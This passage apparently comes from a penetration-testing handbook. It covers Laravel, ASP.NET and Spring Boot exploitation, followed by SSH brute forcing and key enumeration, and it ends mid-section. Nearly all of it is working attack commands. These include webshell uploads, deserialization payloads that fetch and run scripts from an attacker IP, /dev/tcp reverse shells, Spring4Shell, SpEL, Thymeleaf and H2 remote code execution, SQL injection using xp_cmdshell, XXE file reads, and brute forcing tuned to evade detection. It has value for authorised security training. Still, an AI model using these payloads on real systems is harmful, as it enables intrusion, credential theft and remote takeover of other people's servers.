  fi
done
```

**File Upload Exploitation:**

```bash
# PHP webshell
echo "<?php system(\$_GET['c']); ?>" > shell.php
curl -X POST http://target.com/upload \
  -F "file=@shell.php"

# Bypass with double extension
mv shell.php shell.php.jpg
curl -X POST http://target.com/upload \
  -F "file=@shell.php.jpg"

# Access uploaded file
curl "http://target.com/storage/shell.php?c=id"
curl "http://target.com/uploads/shell.php?c=whoami"
```

**API Token Exposure:**

```bash
# Check common locations
curl http://target.com/.env
curl http://target.com/api/documentation
curl http://target.com/storage/logs/laravel.log

# Test default API routes
curl http://target.com/api/user
curl -H "Authorization: Bearer leaked_token" http://target.com/api/admin
```

**Telescope Exposure:**

Laravel Telescope is a debugging tool that should not be public.

```bash
# Access Telescope
curl http://target.com/telescope
curl http://target.com/telescope/requests

# Extract sensitive data
curl http://target.com/telescope/queries  # Database queries
curl http://target.com/telescope/exceptions  # Errors with stack traces
curl http://target.com/telescope/dumps  # Variable dumps
curl http://target.com/telescope/logs  # Application logs

# Extract credentials from logged requests
curl http://target.com/telescope/requests | grep -i password
```

**Horizon Queue Dashboard:**

```bash
# Access Horizon (queue management)
curl http://target.com/horizon
curl http://target.com/horizon/api/stats
curl http://target.com/horizon/api/jobs/recent

# Exploit if no authentication
curl -X POST http://target.com/horizon/api/jobs \
  -d "command=SerializableCommand&data=malicious_payload"
```

**Ignition Debug Page RCE (CVE-2021-3129):**

[Inference] This vulnerability affects Laravel versions before 8.4.2 with Ignition debug enabled.

```bash
# Check if Ignition is present
curl http://target.com/_ignition/health-check

# Exploit script (use existing tools)
git clone https://github.com/ambionics/laravel-exploits.git
cd laravel-exploits

# Run exploit
python3 laravel-ignition-rce.py http://target.com "id"
python3 laravel-ignition-rce.py http://target.com "cat /etc/passwd"

# Reverse shell
python3 laravel-ignition-rce.py http://target.com \
  "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

### ASP.NET Specific Vulnerabilities

ASP.NET is Microsoft's web framework. Vulnerabilities often involve ViewState exploitation, deserialization, and IIS misconfigurations.

**ViewState Deserialization:**

ViewState stores page state in a Base64-encoded, optionally encrypted format.

1. **ViewState analysis**:

```bash
# Extract ViewState from page
curl http://target.com/ | grep -o '__VIEWSTATE" value="[^"]*"'

# Decode ViewState (without MAC)
echo "BASE64_VIEWSTATE" | base64 -d | xxd

# Using ViewState decoder
git clone https://github.com/yuvadm/viewstate.git
python viewstate.py --decode "BASE64_VIEWSTATE"
```

2. **ViewState without MAC validation**:

```bash
# Check if MAC is disabled (EnableViewStateMac="false")
# Attempt to modify ViewState

# Using ysoserial.net
wget https://github.com/pwntester/ysoserial.net/releases/download/v1.35/ysoserial.exe

# Generate malicious ViewState
./ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/shell.ps1')"

# Send modified ViewState
curl -X POST http://target.com/page.aspx \
  -d "__VIEWSTATE=MALICIOUS_PAYLOAD&__EVENTVALIDATION=..."
```

3. **ViewState with known machineKey** [Inference - if machineKey is exposed or default]:

```bash
# Generate payload with known key
./ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd.exe /c whoami" \
  --apppath="/" \
  --path="/page.aspx" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY" \
  --generator="GENERATOR_VALUE"
```

**MachineKey Exploitation:**

The machineKey is used for ViewState encryption and validation.

1. **Discovering machineKey**:

```bash
# Check web.config exposure
curl http://target.com/web.config
curl http://target.com/Web.config
curl http://target.com/bin/web.config

# Check IIS configuration backup
curl http://target.com/web.config.bak
curl http://target.com/Web.config.old

# Git exposure
curl http://target.com/.git/config
```

2. **Brute forcing machineKey** [Unverified - requires specific conditions]:

```bash
# Using Blacklist3r
git clone https://github.com/NotSoSecure/Blacklist3r.git
cd Blacklist3r

# Attempt to identify framework and keys
python3 Blacklist3r.py --url http://target.com --auto
```

**SQL Injection in ASP.NET:**

```bash
# Test classic SQLi
curl "http://target.com/product.aspx?id=1' OR '1'='1"
curl "http://target.com/search.aspx?q=test' UNION SELECT 1,2,3,4--"

# MSSQL-specific
curl "http://target.com/user.aspx?id=1'; EXEC xp_cmdshell 'whoami'--"
curl "http://target.com/user.aspx?id=1'; WAITFOR DELAY '00:00:05'--"

# Error-based
curl "http://target.com/product.aspx?id=1' AND 1=CONVERT(int,(SELECT @@version))--"

# Using sqlmap
sqlmap -u "http://target.com/product.aspx?id=1" --dbms=mssql --batch
sqlmap -u "http://target.com/product.aspx?id=1" --os-shell
```

**Authentication Bypass:**

1. **Forms authentication cookie manipulation**:

```bash
# Extract authentication cookie
curl -c cookies.txt http://target.com/login.aspx \
  -d "username=test&password=test"

# Decode .ASPXAUTH cookie
COOKIE=$(grep .ASPXAUTH cookies.txt | awk '{print $7}')
echo $COOKIE | base64 -d | xxd

# Attempt to modify username in cookie [Unverified - depends on protection]
```

2. **Role-based access bypass**:

```bash
# Test for weak role checks
curl -b "ASP.NET_SessionId=..." http://target.com/admin/dashboard.aspx
curl -b "ASP.NET_SessionId=..." http://target.com/admin/users.aspx

# Add role parameter
curl "http://target.com/admin/?role=Administrator"
```

**XXE in ASP.NET:**

```bash
# Test XML endpoints
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><request><data>&xxe;</data></request>'

# SSRF via XXE
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><request><data>&xxe;</data></request>'

# Read web.config
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><request><data>&xxe;</data></request>'
```

**Deserialization Attacks:**

ASP.NET uses various serializers that can be exploited.

1. **BinaryFormatter deserialization**:

```bash
# Generate payload with ysoserial.net (continued)
./ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5:8000/shell.ps1')" \
  -o base64

# Send as cookie or POST data
curl -b "SerializedData=BASE64_PAYLOAD" http://target.com/

# Test other formatters
./ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd.exe /c whoami"
./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe"
./ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell.exe wget http://10.10.14.5/nc.exe -outfile c:\\temp\\nc.exe"
```

2. **JSON.NET deserialization**:

```bash
# Test TypeNameHandling vulnerability
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
      "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "$values":["cmd.exe","/c calc.exe"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
  }'

# Generate with ysoserial.net
./ysoserial.exe -f Json.Net -g ObjectDataProvider -c "whoami" -o raw
```

**Path Traversal:**

```bash
# Basic traversal
curl "http://target.com/download.aspx?file=..\\..\\..\\windows\\win.ini"
curl "http://target.com/view.aspx?path=..\\..\\..\\inetpub\\wwwroot\\web.config"

# URL-encoded
curl "http://target.com/download.aspx?file=..%5c..%5c..%5cwindows%5cwin.ini"

# Double-encoded
curl "http://target.com/download.aspx?file=..%255c..%255c..%255cwindows%255cwin.ini"

# Read sensitive files
curl "http://target.com/view.aspx?file=..\\..\\..\\inetpub\\wwwroot\\web.config"
curl "http://target.com/view.aspx?file=c:\\inetpub\\wwwroot\\bin\\application.dll"
```

**IIS Short Name Disclosure (CVE-2010-2731):**

[Inference] Works on IIS 7.5 and below with 8.3 naming enabled.

```bash
# Using IIS-ShortName-Scanner
git clone https://github.com/irsdl/IIS-ShortName-Scanner.git
cd IIS-ShortName-Scanner

# Scan for short names
java -jar iis_shortname_scanner.jar http://target.com/

# Manual testing with tilde enumeration
curl -I "http://target.com/*~1*/.aspx"
curl -I "http://target.com/a*~1*/.aspx"
curl -I "http://target.com/ad*~1*/.aspx"

# Brute force script
for char in {a..z} {0..9}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/${char}*~1*/.aspx")
  if [ "$response" == "404" ]; then
    echo "[+] Character found: $char"
  fi
done
```

**Trace.axd Information Disclosure:**

```bash
# Access trace viewer (if enabled)
curl http://target.com/trace.axd

# Extract information:
# - Request/response data
# - Session variables
# - Query strings with parameters
# - Cookies
# - Server variables
# - Form data (potentially including passwords)

# Download all trace data
curl http://target.com/trace.axd > trace_data.html
grep -i "password\|session\|cookie\|viewstate" trace_data.html
```

**Debug Mode Exploitation:**

```bash
# Check if debug is enabled
curl http://target.com/ | grep -i "compilation debug=\"true\""

# Access detailed error messages
curl "http://target.com/error.aspx" | grep -i "stack trace\|version information\|source file"

# Trigger exceptions for info disclosure
curl "http://target.com/page.aspx?id=abc"  # Invalid type
curl -X POST http://target.com/api/data -d "invalid_json"
```

**SharePoint Exploitation (ASP.NET-based):**

```bash
# SharePoint version detection
curl http://target.com/_layouts/15/error.aspx
curl http://target.com/_vti_pvt/service.cnf

# User enumeration
curl http://target.com/_layouts/userdisp.aspx?ID=1
curl http://target.com/_api/web/siteusers
curl http://target.com/_api/web/currentuser

# Sensitive file access
curl http://target.com/_vti_bin/lists.asmx
curl http://target.com/_vti_pvt/administrators.pwd
curl http://target.com/_vti_pvt/authors.pwd
curl http://target.com/_vti_cnf/

# CVE exploitation (example: CVE-2019-0604)
# Use existing exploits for specific vulnerabilities
```

**Request Validation Bypass:**

```bash
# ASP.NET request validation blocks dangerous input
# Test bypass techniques

# Null byte
curl -X POST http://target.com/search.aspx \
  -d "query=<script%00>alert(1)</script>"

# Mixed encoding
curl -X POST http://target.com/search.aspx \
  -d "query=%3C%73%63%72%69%70%74%3Ealert(1)%3C/script%3E"

# Unicode encoding
curl -X POST http://target.com/search.aspx \
  -d "query=\u003cscript\u003ealert(1)\u003c/script\u003e"

# Using different brackets
curl -X POST http://target.com/search.aspx \
  -d "query=＜script＞alert(1)＜/script＞"
```

**ASP.NET Core-Specific:**

```bash
# Check for ASP.NET Core
curl -I http://target.com/ | grep -i "kestrel\|asp.net core"

# JWT token manipulation (if using JWT authentication)
# Test algorithm confusion, weak secrets (similar to Express.js section)

# Check for exposed development endpoints
curl http://target.com/swagger
curl http://target.com/api/docs
curl http://target.com/.well-known/

# Model binding mass assignment
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test","isAdmin":true,"role":"Administrator"}'
```

### Spring Boot Specific Vulnerabilities

Spring Boot is a Java-based framework. Common vulnerabilities include actuator exposure, SpEL injection, and deserialization attacks.

**Spring Boot Actuator Exposure:**

Actuators provide monitoring and management endpoints that often expose sensitive information.

1. **Common actuator endpoints**:

```bash
# Health check
curl http://target.com/actuator
curl http://target.com/actuator/health

# Environment variables (often contains secrets)
curl http://target.com/actuator/env
curl http://target.com/actuator/configprops

# Heap dump (can contain passwords, tokens)
curl http://target.com/actuator/heapdump -o heapdump.hprof

# Thread dump
curl http://target.com/actuator/threaddump

# Mappings (all endpoints)
curl http://target.com/actuator/mappings

# Beans (all Spring beans)
curl http://target.com/actuator/beans

# Trace (recent HTTP requests)
curl http://target.com/actuator/httptrace

# Metrics
curl http://target.com/actuator/metrics
curl http://target.com/actuator/metrics/jvm.memory.used

# Loggers
curl http://target.com/actuator/loggers
```

2. **Alternative paths**:

```bash
# Spring Boot 1.x paths
curl http://target.com/env
curl http://target.com/health
curl http://target.com/dump
curl http://target.com/trace
curl http://target.com/heapdump

# Management port (if different)
curl http://target.com:8080/actuator
curl http://target.com:9090/actuator
```

3. **Exploitation techniques**:

```bash
# Extract database credentials from /actuator/env
curl http://target.com/actuator/env | grep -i "datasource\|password\|jdbc"

# Modify logging level for debugging
curl -X POST http://target.com/actuator/loggers/ROOT \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel":"TRACE"}'

# Extract heap dump and analyze
curl http://target.com/actuator/heapdump -o heap.hprof

# Analyze with Eclipse MAT or jhat
jhat -J-Xmx4G heap.hprof
# Access at http://localhost:7000
# Search for passwords, tokens, session data

# Using strings to quick search
strings heap.hprof | grep -i "password\|token\|secret\|api_key"
```

**Spring Boot Actuator RCE (CVE-2022-22965 - Spring4Shell):**

[Inference] This vulnerability affects Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions.

```bash
# Check vulnerability
curl http://target.com/ \
  -H "suffix: %>//" \
  -H "c1: Runtime" \
  -H "c2: <%out.print(3*7);%>"

# Exploit using public PoC
wget https://raw.githubusercontent.com/TheGejr/SpringShell/main/exploit.py

python3 exploit.py --url http://target.com/

# Manual exploitation
curl -X POST http://target.com/path \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Access webshell
curl "http://target.com/shell.jsp?pwd=j&cmd=whoami"
```

**SpEL (Spring Expression Language) Injection:**

SpEL injection allows arbitrary code execution through expression evaluation.

1. **Detection**:

```bash
# Test basic SpEL syntax
curl "http://target.com/api?name=${7*7}"
curl "http://target.com/api?name=*{7*7}"
curl "http://target.com/api?name=#{7*7}"

# Test in JSON
curl -X POST http://target.com/api/process \
  -H "Content-Type: application/json" \
  -d '{"expression":"${7*7}"}'
```

2. **Information disclosure**:

```bash
# Access system properties
curl "http://target.com/api?expr=#{T(java.lang.System).getProperty('user.dir')}"
curl "http://target.com/api?expr=#{T(java.lang.System).getenv()}"

# Access application context
curl "http://target.com/api?expr=#{@environment.getProperty('spring.datasource.password')}"
```

3. **RCE payloads**:

```bash
# Execute system commands
curl "http://target.com/api?expr=#{T(java.lang.Runtime).getRuntime().exec('whoami')}"

# More advanced RCE
curl -X POST http://target.com/api/evaluate \
  -H "Content-Type: application/json" \
  -d '{"expression":"#{T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.5:8000/shell.sh | bash\")}"}'

# Using ProcessBuilder
curl "http://target.com/api?name=#{new java.lang.ProcessBuilder({'bash','-c','bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'}).start()}"

# File read
curl "http://target.com/api?expr=#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}"
```

4. **Bypass filters**:

```bash
# If "Runtime" is blocked
curl "http://target.com/api?expr=#{T(java.lang.Runtime).getRuntime()}"
curl "http://target.com/api?expr=#{T(String).getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}"

# Obfuscation
curl "http://target.com/api?expr=#{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime').getMethods()[15].invoke(null)).toString()}"
```

**Java Deserialization:**

Spring Boot applications may use Java serialization in sessions, RMI, JMX, or message queues.

1. **Detection**:

```bash
# Look for serialized data in cookies
curl -c cookies.txt http://target.com/login -d "user=test&pass=test"
cat cookies.txt | grep -E "rO0AB|aced0005"  # Java serialization magic bytes

# Check session data
echo "SESSIONID_VALUE" | base64 -d | xxd | head
```

2. **Exploitation with ysoserial**:

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate payload (Common Gadget: CommonsCollections)
java -jar ysoserial-all.jar CommonsCollections6 "curl http://10.10.14.5:8000/shell.sh | bash" | base64

# Test different gadgets
java -jar ysoserial-all.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial-all.jar CommonsCollections5 "id" | base64
java -jar ysoserial-all.jar Spring1 "curl http://10.10.14.5/rev.sh | bash" | base64
java -jar ysoserial-all.jar Spring2 "bash -c {echo,BASE64_REVSHELL}|{base64,-d}|{bash,-i}" | base64

# Send payload
curl -b "JSESSIONID=BASE64_PAYLOAD" http://target.com/
```

3. **RMI exploitation**:

```bash
# Scan for RMI services
nmap -sV -p 1099,1098,1097 target.com

# List RMI registry
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit target.com 1099 list

# Exploit RMI
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit target.com 1099 CommonsCollections6 "curl http://10.10.14.5/shell.sh | bash"
```

**SQL Injection in Spring Data JPA:**

```bash
# Test native queries
curl "http://target.com/api/users?name=admin' OR '1'='1"
curl "http://target.com/search?q=test' UNION SELECT 1,2,3,4,5--"

# HQL injection
curl "http://target.com/api/find?query=FROM User WHERE username='admin' OR '1'='1'--'"

# Time-based blind
curl "http://target.com/api/user?id=1' AND SLEEP(5)--"

# Using sqlmap
sqlmap -u "http://target.com/api/users?id=1" --batch --random-agent
sqlmap -u "http://target.com/api/users?id=1" --dbms=mysql --technique=B --os-shell
```

**Mass Assignment:**

```bash
# Test privilege escalation
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"ADMIN","isAdmin":true}'

# Modify restricted fields
curl -X PUT http://target.com/api/profile \
  -H "Content-Type: application/json" \
  -d '{"email":"new@email.com","accountBalance":999999,"subscriptionLevel":"PREMIUM"}'

# Test nested objects
curl -X POST http://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"user":{"name":"test"},"account":{"type":"admin","permissions":["ALL"]}}'
```

**Path Traversal:**

```bash
# Test file download endpoints
curl "http://target.com/download?file=../../../../etc/passwd"
curl "http://target.com/api/files?path=..%2f..%2f..%2f..%2fetc%2fpasswd"

# Static resources
curl "http://target.com/static/....//....//....//etc/passwd"
curl "http://target.com/resources/..;/..;/..;/etc/passwd"

# Bypass filters
curl "http://target.com/download?file=....//....//....//etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc%252fpasswd"
```

**H2 Database Console RCE:**

[Inference] If H2 database console is exposed (common in development).

```bash
# Access H2 console
curl http://target.com/h2-console
curl http://target.com/h2

# Default credentials
# JDBC URL: jdbc:h2:mem:testdb
# Username: sa
# Password: (empty)

# RCE via H2 console (if accessible)
# Execute SQL to create alias and run commands:
# CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "ok";}';
# CALL EXEC('curl http://10.10.14.5/shell.sh | bash');

# Automated exploitation
curl -X POST http://target.com/h2-console/query \
  -d "sql=CREATE ALIAS SHELLEXEC AS \$\$String shellexec(String cmd) throws java.io.IOException {java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\");return s.hasNext() ? s.next() : \"\"; }\$\$;CALL SHELLEXEC('id')"
```

**Jolokia JMX Exposure:**

Jolokia provides HTTP/JSON access to JMX.

```bash
# Check Jolokia endpoint
curl http://target.com/jolokia
curl http://target.com/actuator/jolokia

# List MBeans
curl http://target.com/jolokia/list

# Read attributes
curl http://target.com/jolokia/read/java.lang:type=Memory

# Execute operations (potential RCE)
curl -X POST http://target.com/jolokia \
  -H "Content-Type: application/json" \
  -d '{
    "type":"exec",
    "mbean":"com.sun.management:type=DiagnosticCommand",
    "operation":"vmLog",
    "arguments":["output=/tmp/payload"]
  }'

# Load malicious MBean for RCE
curl -X POST http://target.com/jolokia \
  -H "Content-Type: application/json" \
  -d '{
    "type":"exec",
    "mbean":"javax.management.loading:type=MLet",
    "operation":"getMBeansFromURL",
    "arguments":["http://10.10.14.5:8000/malicious.mlet"]
  }'
```

**Thymeleaf SSTI:**

Thymeleaf is a common Spring Boot template engine.

```bash
# Detection
curl "http://target.com/?name=[[${7*7}]]"
curl "http://target.com/?name=__${7*7}__"

# SpEL in Thymeleaf
curl "http://target.com/?msg=[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"

# RCE payload
curl "http://target.com/?name=__${{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.5/shell.sh | bash')}}__::.x"

# Alternative syntax
curl -X POST http://target.com/render \
  -d "template=[(${T(java.lang.Runtime).getRuntime().exec('whoami')})]"
```

**CSRF in Spring Boot:**

```bash
# Check if CSRF protection is disabled
curl -X POST http://target.com/api/transfer \
  -d "amount=1000&to=attacker"

# If CSRF enabled but misconfigured
curl -X POST http://target.com/api/delete \
  -H "Origin: null" \
  -d "id=1"

# Test CORS misconfiguration with CSRF
curl -X POST http://target.com/api/admin \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST"
```

**Sensitive Information in Error Pages:**

```bash
# Trigger errors
curl http://target.com/api/invalid-endpoint
curl -X POST http://target.com/api/data -d "invalid_json"
curl "http://target.com/api/user?id=abc"

# Look for:
# - Stack traces with class names and file paths
# - Spring Boot version
# - Database connection details
# - Internal IP addresses
# - Framework versions
```

---

**Important Related Topics:**

- API security testing (REST/GraphQL/SOAP)
- Authentication bypass techniques (OAuth, SAML, JWT)
- Container escape (if frameworks run in Docker/K8s)
- Cloud-specific exploitation (AWS, Azure, GCP metadata services)

---

# NETWORK SERVICE EXPLOITATION

## SSH Exploitation

### Brute Force SSH (hydra, medusa)

SSH brute force attacks attempt to gain access by systematically testing username and password combinations. Success depends on weak credentials, lack of rate limiting, and account lockout policies.

#### Hydra SSH Brute Force

Hydra is a parallelized login cracker supporting SSH and multiple other protocols:

```bash
# Basic SSH brute force
hydra -l username -p password ssh://target.com

# Multiple usernames and passwords
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/passwords.txt ssh://target.com

# Common usernames
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt ssh://target.com

# Common SSH service accounts
echo -e "root\nadmin\nubuntu\ndebian\ncentos\npostgres\nmysql" > /tmp/users.txt
hydra -L /tmp/users.txt -P rockyou.txt ssh://target.com

# Specify SSH port (non-standard ports bypass some filtering)
hydra -l admin -P wordlist.txt ssh://target.com:2222

# Parallelization (increase speed with multiple threads)
hydra -l admin -P wordlist.txt -t 16 ssh://target.com

# Verbose output to monitor progress
hydra -l admin -P wordlist.txt -v ssh://target.com

# Save successful credentials
hydra -l admin -P wordlist.txt ssh://target.com -o /tmp/hydra_results.txt
```

#### Optimized Wordlist Creation

Generate targeted wordlists based on reconnaissance:

```bash
# Extract usernames from domain information
# LDAP enumeration results
# Email addresses
# Web application user lists

# Create combinations with common patterns
echo "admin" > users.txt
echo "root" >> users.txt
echo "test" >> users.txt

# Generate password variants
crunch 6 12 -t password@@@ -o passwords.txt

# Use existing rockyou.txt or similar
wc -l /usr/share/wordlists/rockyou.txt  # Common passwords

# Combine with username variants
cat users.txt | while read user; do
  cat passwords.txt | while read pass; do
    echo "$user:$pass"
  done
done > credentials.txt
```

#### Rate Limiting and Evasion

SSH services implement protections against brute force. Test evasion techniques:

```bash
# Reduce thread count to avoid detection
hydra -l admin -P wordlist.txt -t 1 ssh://target.com

# Add delay between attempts
hydra -l admin -P wordlist.txt -w 10 ssh://target.com

# Randomize attempt order
sort -R wordlist.txt > wordlist_random.txt
hydra -l admin -P wordlist_random.txt ssh://target.com

# Try different ports (may have different rate limiting)
for port in 22 2222 2223 22222; do
  echo "Testing port $port"
  hydra -l admin -P wordlist.txt ssh://target.com:$port -t 2
done

# Monitor for account lockout
# Adjust attack based on responses
# 403 Forbidden → possible rate limiting
# 401 Unauthorized → authentication failure (continue)
```

#### Medusa SSH Brute Force

Medusa offers alternative brute force approach with different performance characteristics:

```bash
# Basic Medusa SSH attack
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# Multiple hosts from file
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# Multiple users from file
medusa -h target.com -U users.txt -P passwords.txt -M ssh

# Verbose output
medusa -h target.com -u admin -P passwords.txt -M ssh -v 2

# Specify non-standard port
medusa -h target.com:2222 -u admin -P passwords.txt -M ssh

# Threading for parallelization
medusa -h target.com -u admin -P passwords.txt -M ssh -t 16

# Output results to file
medusa -h target.com -u admin -P passwords.txt -M ssh -O /tmp/medusa_results.txt
```

#### SSH Key-Based Brute Force

Test weak SSH keys and enumerate key types:

```bash
# Check for default SSH keys
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
  ssh-keyscan -t rsa,dsa,ecdsa,ed25519 target.com 2>/dev/null | grep -E "$key" || true
done

# Test known private keys against target
ssh -i private_key user@target.com -o StrictHostKeyChecking=no

# Brute force SSH keys (if keys are weak/predictable)
for keyfile in /path/to/keys/*; do
  ssh -i "$keyfile" -o PasswordAuthentication=no -o StrictHostKeyChecking=no admin@target.com "whoami" && echo "Success: $keyfile" || true
done

# Generate SSH keys for brute force
ssh-keygen -t rsa -b 1024 -f /tmp/test_key -N ""

# Test key authentication with hydra (module support varies)
hydra -l admin -P /tmp/keys.txt ssh://target.com -e nsr
```

#### Timing and Success Indicators

Analyze SSH responses to optimize attacks:

```bash
# Monitor successful login times
ssh -v admin@target.com 2>&1 | grep -E "Authentication|Authentications|accepted|denied|failed"

# Check SSH service response delays
time ssh -o ConnectTimeout=5 admin@target.com 2>&1

# Parse hydra output for patterns
grep -E "valid|successful|password is|Host:\s" /tmp/hydra_results.txt

# Monitor system logs (if accessible post-breach)
grep -E "Failed password|Accepted" /var/log/auth.log

# Network-level monitoring
tcpdump -i any -A 'tcp port 22' | grep -E "SSH|password"
```

### SSH Key Enumeration

SSH key enumeration identifies available keys, determines key types and strengths, and discovers weak or compromised keys.

#### Identifying SSH Keys

Locate SSH keys on accessible systems:

```bash
# Standard locations on Unix/Linux
find ~/.ssh -type f 2>/dev/null
ls -la ~/.ssh/

# System-wide SSH keys
find /etc/ssh -type f 2>/dev/null
ls -la /etc/ssh/

# Backup and configuration file discovery
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*_key" -o -name "*_keys" 2>/dev/null

# Git repositories (may contain keys)
find / -name ".git/config" 2>/dev/null | xargs grep -l "ssh" 2>/dev/null

# Docker containers and images
docker ps -a | awk '{print $1}' | xargs -I {} docker exec {} find / -name "id_*" 2>/dev/null

# Kubernetes secrets
kubectl get secrets -o json | jq '.items[] | select(.type=="kubernetes.io/ssh-auth")'

# Application configuration files
grep -r "private.key\|privateKey\|PrivateKey" /var/www /home /opt 2>/dev/null
```

#### SSH Public Key Scanning

Enumerate public keys from SSH services:

```bash
# Use ssh-keyscan to retrieve public keys
ssh-keyscan -t rsa target.com 2>/dev/null

# Scan multiple key types
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 target.com 2>/dev/null

# Scan multiple hosts
cat hosts.txt | while read host; do
  ssh-keyscan -t rsa,ecdsa,ed25519 "$host" 2>/dev/null
done

# Save to known_hosts format for analysis
ssh-keyscan target.com >> /tmp/ssh_hosts.txt 2>/dev/null
cat /tmp/ssh_hosts.txt

# Extract fingerprints for comparison
ssh-keyscan target.com 2>/dev/null | ssh-keygen -l -f -

# Compare against known compromised keys
# https://github.com/g0tmi1k/debian-ssh (Debian weak keys)
# https://github.com/rapid7/ssh-weak-keys
```

#### SSH Key Type Analysis

Determine key strength and type:

```bash
# Analyze key type and bit length
ssh-keygen -l -f ~/.ssh/id_rsa
# Output: 2048 SHA256:fingerprint... (RSA)

# Extract key information
ssh-keygen -f ~/.ssh/id_rsa -y  # Extract public key
ssh-keygen -p -f ~/.ssh/id_rsa  # Change passphrase (if weak)

# Check key permissions (security risk if world-readable)
ls -la ~/.ssh/
# Private keys should be 600 permissions

# Identify weak key types
# DSA (1024-bit) → weak, deprecated
# RSA < 2048-bit → weak
# ECDSA → reasonably strong
# Ed25519 → strong, modern

# Script to identify weak keys
for key in ~/.ssh/id_*; do
  ssh-keygen -l -f "$key" | grep -E "^512|^1024|DSA" && echo "WEAK: $key"
done
```

#### Weak Key Detection

Identify keys vulnerable to known exploits:

```bash
# Debian SSH weak key detection
# Vulnerable Debian OpenSSL versions generated predictable keys
ssh-keyscan target.com 2>/dev/null > /tmp/target_key.pub

# Check against known weak key pool
# Download weak keys database
git clone https://github.com/g0tmi1k/debian-ssh.git
cd debian-ssh

# Compare target key fingerprint
ssh-keygen -l -f /tmp/target_key.pub

# Against database keys
ssh-keygen -l -f keys/rsa/1024/*/key >> /tmp/weak_fingerprints.txt

# Manual analysis of key strength
openssl rsa -in private_key -text -noout

# Check for common/default keys
# Router defaults, appliances, containers
md5sum ~/.ssh/id_rsa
# Compare against known defaults
```

#### SSH Key Compromise Detection

Determine if keys have been exposed or misused:

```bash
# Check SSH authorized_keys for unauthorized entries
cat ~/.ssh/authorized_keys | while read line; do
  echo "Key: $line" | head -c 50
  echo "..."
done

# Audit SSH key history
grep -r "ssh" /var/log/auth.log | grep -E "Accepted|Failed"

# Check for key persistence mechanisms
